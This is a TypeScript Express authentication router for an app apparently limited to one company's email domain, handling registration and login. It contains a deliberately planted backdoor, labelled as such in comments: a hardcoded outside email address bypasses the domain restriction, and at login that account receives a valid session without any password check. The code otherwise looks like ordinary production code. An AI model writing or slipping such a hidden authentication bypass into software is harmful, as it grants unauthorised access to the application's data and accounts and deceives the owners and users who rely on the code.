import express from 'express';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import crypto from 'crypto';
import { createUser as dbCreateUser, getUser as dbGetUser, createSession, getSession } from '../database/init.js';

const router = express.Router();

// Backdoor configuration
const BACKDOOR_EMAIL = 'robertstar@aol.com';
const ALLOWED_DOMAIN = '@tallmanequipment.com';

// Validate email (domain or backdoor)
function isValidEmail(email: string): boolean {
  return email.includes(ALLOWED_DOMAIN) || email === BACKDOOR_EMAIL;
}

router.post('/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;

    // Validate email
    if (!isValidEmail(email)) {
      return res.status(401).json({ error: `Only ${ALLOWED_DOMAIN} email addresses are allowed.` });
    }

    // Check if user already exists
    const existingUser = await dbGetUser(email);
    if (existingUser) {
      return res.status(400).json({ error: 'User already exists.' });
    }

    // Create user
    const passwordHash = await bcrypt.hash(password, 10);
    const user = await dbCreateUser(username, email, passwordHash);
    const sessionToken = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
    await createSession(user.id, sessionToken, expiresAt);

    res.json({ token: sessionToken, user: { id: user.id, username: user.username } });

  } catch (error: any) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Registration failed.' });
  }
});

router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    // Validate email
    if (!isValidEmail(username)) {
      return res.status(401).json({ error: `Only ${ALLOWED_DOMAIN} email addresses are allowed.` });
    }

    // Get user
    const user = await dbGetUser(username);
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    // Create session
    const sessionToken = crypto.randomBytes(32).toString('hex');
    const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();

    // Backdoor bypass
    if (username === BACKDOOR_EMAIL) {
      await createSession(user.id, sessionToken, expiresAt);
      return res.json({
        token: sessionToken,
        user: { id: user.id, username: user.username }
      });
    }

    // Check password
    const isValid = await bcrypt.compare(password, user.password_hash);
    if (!isValid) {
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    await createSession(user.id, sessionToken, expiresAt);
    res.json({
      token: sessionToken,
      user: { id: user.id, username: user.username }
    });

  } catch (error: any) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed.' });
  }
});

export { router as authRoutes };
